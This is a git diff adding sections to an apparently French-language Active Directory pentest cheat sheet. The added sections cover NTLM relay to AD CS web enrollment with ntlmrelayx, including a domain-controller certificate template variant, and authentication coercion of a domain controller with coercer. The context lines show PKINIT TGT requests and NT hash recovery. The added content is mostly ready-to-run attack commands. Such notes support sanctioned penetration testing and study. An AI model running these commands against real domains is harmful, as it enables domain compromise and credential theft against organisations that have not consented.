@@ -75,6 +75,8 @@ date: '2024-01-10'
     - [création de certificats](#création-de-certificats)
     - [Demande de TGT avec un certificat](#demande-de-tgt-avec-un-certificat)
     - [Récupération du hash via un tgt](#récupération-du-hash-via-un-tgt)
+    - [Relai sur le web enrollement de l'ADCS](#relai-sur-le-web-enrollement-de-ladcs)
+    - [Coerce de gros porc](#coerce-de-gros-porc)
 - [Lab](#lab)
   - [**AD**](#ad)
   - [Srv standelone](#srv-standelone)
@@ -549,6 +551,17 @@ gettgtpkinit.py -cert-pfx cert.pfx -dc-ip dc.domain.local domain.local/user tgt.
 getnthash.py -k key  -dc-ip dc.domain.local domain.local/user
 ```
 
+### Relai sur le web enrollement de l'ADCS
+
+```
+ntlmrelayx.py -t "http://adcs.domain.local/certsrv/certfnsh.asp" -smb2support --adcs
+ntlmrelayx.py -t "http://srv.klemou.corp/certsrv/certfnsh.asp" -smb2support --adcs --template DomainController # pour les DC
+```
+### Coerce de gros porc
+
+```
+coercer  coerce -l ipAttaquant -d domain.local -u user -p pass -t dc.domain.local
+```
 
 
 # Lab
